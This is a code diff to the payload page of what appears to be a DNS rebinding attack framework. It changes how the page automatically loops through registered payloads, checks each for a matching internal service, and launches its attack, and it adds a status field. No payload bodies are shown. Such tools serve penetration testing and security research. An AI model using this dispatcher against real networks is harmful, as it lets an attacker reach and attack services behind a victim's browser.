@@ -469,16 +469,22 @@ func (pth *PayloadTemplateHandler) ServeHTTP(w http.ResponseWriter, r *http.Requ
 	{{ .JavaScriptCode }}
 
 	function attack(payload, headers, cookie, body) {
-	const titleEl = document.getElementById('title');
+		const titleEl = document.getElementById('title');
 		if (payload === 'automatic') {
-			for (let payload in Registry) {
-				if (Registry[payload].isService(headers, cookie, body) === true) {
-					titleEl.innerText = payload;
-					console.log("Payload " + payload + " has identified a service.");
-					Registry[payload].attack(headers, cookie, body);
-					break;
+			(async function loop() {
+				for (let payload in Registry) {
+					console.log("Trying payload: " + payload + " for frame: " + window.location);
+					await Registry[payload].isService(headers, cookie, body)
+						.then(response => {
+							if (response === true) {
+								titleEl.innerText = payload;
+								console.log("Payload: " + payload + " has identified a service for frame: " + window.location);
+								Registry[payload].attack(headers, cookie, body);
+								return;
+							}
+						})
 				}
-			};
+			})();
 		} else {
 			titleEl.innerText = payload;
 			Registry[payload].attack(headers, cookie, body);
@@ -486,7 +492,8 @@ func (pth *PayloadTemplateHandler) ServeHTTP(w http.ResponseWriter, r *http.Requ
 	}
 	</script></head>
 	<body onload="begin('/')")><h3 id='title'>Rebinding...</h3>
-	<p><span id='hostname'></span>. <span id='rebindingstatus'>This page is waiting for a DNS update.</span></p>
+	<p><span id='hostname'></span>. <span id='rebindingstatus'>This page is waiting for a DNS update.</span>
+	<span id='payloadstatus'></span></p>
 	</body></html>`
 
 	check := func(err error) {
